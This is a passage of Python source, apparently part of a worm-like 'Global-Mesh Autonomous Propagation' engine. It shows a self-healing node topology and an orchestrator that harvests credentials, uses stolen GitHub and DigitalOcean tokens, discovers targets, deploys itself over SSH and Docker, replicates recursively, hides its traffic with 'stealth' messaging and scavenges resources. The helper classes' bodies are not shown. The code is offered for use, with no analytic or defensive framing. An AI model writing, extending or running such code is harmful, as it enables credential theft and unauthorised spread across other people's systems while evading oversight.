            self._topology[node_id].alive = False
            logger.warning("Topology: node %s marked DEAD", node_id)

    async def mark_alive(self, node_id: str) -> None:
        if node_id in self._topology:
            self._topology[node_id].alive = True
            self._topology[node_id].last_state_sync = time.time()

    def find_nearest_alive(self, dead_node_id: str) -> Optional[TopologyNode]:
        """Find the nearest alive node to a dead one (by cluster proximity)."""
        dead = self._topology.get(dead_node_id)
        if not dead:
            return None

        cluster = self._clusters.get(dead.cluster_id, [])
        for nid in cluster:
            node = self._topology.get(nid)
            if node and node.alive and nid != dead_node_id:
                return node

        # Fallback: any alive node
        for node in self._topology.values():
            if node.alive and node.node_id != dead_node_id:
                return node
        return None

    # ── State Persistence ──

    def _save_state(self) -> None:
        try:
            data = {
                "version": self._state_version,
                "timestamp": time.time(),
                "topology": {k: asdict(v) for k, v in self._topology.items()},
                "clusters": self._clusters,
            }
            self.STATE_FILE.write_text(json.dumps(data, indent=2, default=str))
        except Exception as e:
            logger.warning("Topology state save: %s", e)

    def _load_state(self) -> None:
        try:
            if self.STATE_FILE.exists():
                data = json.loads(self.STATE_FILE.read_text())
                self._state_version = data.get("version", 0)
                self._clusters = data.get("clusters", {})
                for nid, ndata in data.get("topology", {}).items():
                    self._topology[nid] = TopologyNode(**ndata)
                logger.info("Loaded topology: %d nodes, %d clusters",
                             len(self._topology), len(self._clusters))
        except Exception as e:
            logger.debug("Topology state load: %s", e)

    # ── Background Loops ──

    async def _topology_health_loop(self) -> None:
        """Periodically check topology health and trigger redeploy if needed."""
        while self._running:
            await asyncio.sleep(30)
            dead_clusters = set()
            for cid, members in self._clusters.items():
                alive = sum(1 for m in members if self._topology.get(m, TopologyNode("","",0)).alive)
                if len(members) >= 2 and alive < len(members) * 0.3:
                    dead_clusters.add(cid)
                    logger.warning("Cluster %s: %d/%d alive — triggering redeploy",
                                    cid, alive, len(members))

            for cid in dead_clusters:
                await self._redeploy_cluster(cid)

            # Also check for isolated dead nodes
            for nid, node in list(self._topology.items()):
                if not node.alive and (time.time() - node.last_state_sync) > 120:
                    nearest = self.find_nearest_alive(nid)
                    if nearest:
                        logger.info("Redeploying dead node %s via %s", nid, nearest.node_id)
                        for cb in self._redeploy_callbacks:
                            try:
                                await cb(nid, node, nearest)
                            except Exception:
                                pass

    async def _state_sync_loop(self) -> None:
        """Periodically persist the topology state."""
        while self._running:
            await asyncio.sleep(60)
            self._state_version += 1
            self._save_state()

    async def _redeploy_cluster(self, cluster_id: str) -> None:
        """Trigger redeployment for a dead cluster."""
        logger.info("Redeploying cluster %s with %d callbacks",
                     cluster_id, len(self._redeploy_callbacks))
        for cb in self._redeploy_callbacks:
            try:
                await cb(None, None, None, cluster_id=cluster_id)
            except Exception:
                pass

    def get_map(self) -> Dict[str, Any]:
        return {
            "nodes": {k: asdict(v) for k, v in self._topology.items()},
            "clusters": dict(self._clusters),
            "version": self._state_version,
            "total_nodes": len(self._topology),
            "alive_nodes": sum(1 for n in self._topology.values() if n.alive),
            "total_clusters": len(self._clusters),
        }


# ═════════════════════════════════════════════
# UNIFIED PROPAGATION ORCHESTRATOR
# ═════════════════════════════════════════════

class PropagationOrchestrator:
    """
    Global-Mesh Autonomous Propagation Protocol.
    Orchestrates all 5 advanced protocols for global-scale propagation.
    """

    def __init__(self, node_id: str = ""):
        self.node_id = node_id or f"propagator-{uuid.uuid4().hex[:8]}"
        self._running = False
        self._event_loop: Optional[asyncio.AbstractEventLoop] = None
        self._thread: Optional[threading.Thread] = None

        # Protocol 1
        self.infiltration = InfrastructureInfiltrator()
        # Protocol 2
        self.replication = RecursiveSelfReplicator()
        # Protocol 3
        self.stealth = StealthCommunicator(self.node_id)
        # Protocol 4
        self.scavenger = ResourceScavenger(self.node_id)
        # Protocol 5
        self.topology = SelfHealingTopology(self.node_id)

        # Wire topology redeploy callback
        self.topology.on_redeploy(self._handle_redeploy)

    # ── Lifecycle ──

    async def start_async(self) -> Dict[str, Any]:
        """Start all 5 propagation protocols."""
        logger.info("=" * 60)
        logger.info("Propagation Engine — Global-Mesh Protocol v1")
        logger.info("Node: %s", self.node_id)
        logger.info("=" * 60)
        self._running = True
        results = {}

        # Protocol 1
        logger.info("[Protocol 1/5] Infrastructure Infiltration...")
        creds = await self.infiltration.harvest_credentials()
        results["creds_found"] = len(creds)
        if "github" in creds:
            gh = await self.infiltration.authenticate_github()
            results["github"] = gh is not None
        targets = await self.infiltration.discover_targets()
        results["targets_found"] = len(targets)

        # Protocol 2
        logger.info("[Protocol 2/5] Recursive Self-Replication...")
        self.replication = RecursiveSelfReplicator(creds.get("github", ""))
        results["replication_ready"] = True

        # Protocol 3
        logger.info("[Protocol 3/5] Stealth Communication...")
        await self.stealth.start()
        results["stealth_active"] = True

        # Protocol 4
        logger.info("[Protocol 4/5] Resource Scavenging...")
        await self.scavenger.start()
        results["scavenger_active"] = True

        # Protocol 5
        logger.info("[Protocol 5/5] Self-Healing Topology...")
        await self.topology.start()
        results["topology_active"] = True

        logger.info("=" * 60)
        logger.info("All 5 propagation protocols active")
        logger.info("=" * 60)
        return results

    def start(self) -> Dict[str, Any]:
        """Start the propagation engine in a background thread."""
        self._event_loop = asyncio.new_event_loop()

        def _run():
            asyncio.set_event_loop(self._event_loop)
            result = self._event_loop.run_until_complete(self.start_async())
            self._event_loop.run_forever()

        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.start()
        time.sleep(0.5)
        return {"status": "started", "node_id": self.node_id}

    async def stop_async(self) -> None:
        self._running = False
        await self.stealth.stop()
        await self.scavenger.stop()
        await self.topology.stop()

    def stop(self) -> None:
        if self._event_loop and self._event_loop.is_running():
            self._event_loop.call_soon_threadsafe(
                lambda: asyncio.create_task(self.stop_async())
            )

    # ── Redeploy Handler ──

    async def _handle_redeploy(self, dead_node_id: Optional[str] = None,
                                 dead_node: Optional[TopologyNode] = None,
                                 nearest: Optional[TopologyNode] = None,
                                 cluster_id: str = "") -> None:
        """Handle redeploy request from topology."""
        if dead_node and nearest:
            logger.info("Redeploy triggered: %s -> near %s", dead_node_id, nearest.node_id)
            # Try to re-bootstrap on the nearest node
            if dead_node.host:
                await self.replication.bootstrap_and_pull(
                    target_host=dead_node.host,
                    target_port=dead_node.port,
                )
        elif cluster_id:
            logger.info("Cluster redeploy triggered: %s", cluster_id)

    # ── Actions ──

    async def infiltrate_and_deploy(self) -> List[DeployedNode]:
        """Full infiltration pipeline: harvest creds, auth, deploy."""
        deployed = []
        await self.infiltration.harvest_credentials()
        targets = await self.infiltration.discover_targets()

        for target in targets[:5]:
            if target.provider == "digitalocean" and "digitalocean" in self.infiltration._creds:
                node = await self.infiltration.deploy_to_digitalocean(
                    self.infiltration._creds["digitalocean"]
                )
                if node:
                    deployed.append(node)
            elif target.provider == "custom" or target.provider == "ssh":
                node = await self.infiltration.deploy_docker_compose(target)
                if node:
                    deployed.append(node)
        return deployed

    async def replicate_to_target(self, host: str, port: int = 22) -> Optional[str]:
        """Replicate the swarm to a specific target host."""
        return await self.replication.bootstrap_and_pull(host, port)

    async def send_stealth_message(self, peer_host: str, peer_port: int,
                                     payload: Dict[str, Any]) -> bool:
        """Send a stealth-wrapped message to a peer."""
        return await self.stealth.send_gossip(peer_host, peer_port, payload)

    async def register_node_capacity(self, node_id: str, host: str, port: int) -> None:
        await self.scavenger.register_node(node_id, host, port)
        await self.topology.register_node(node_id, host, port)

    # ── Status ──

    def get_full_status(self) -> Dict[str, Any]:
        return {
            "node_id": self.node_id,
            "running": self._running,
            "protocols": {
                "1_infiltration": {
                    "creds": list(self.infiltration._creds.keys()),
                    "targets": len(self.infiltration._targets),
                    "deployed": len(self.infiltration._deployed),
                },
                "2_replication": self.replication.get_replication_stats(),
                "3_stealth": self.stealth.get_status(),
                "4_scavenger": self.scavenger.get_status(),
                "5_topology": self.topology.get_map(),
            },
        }
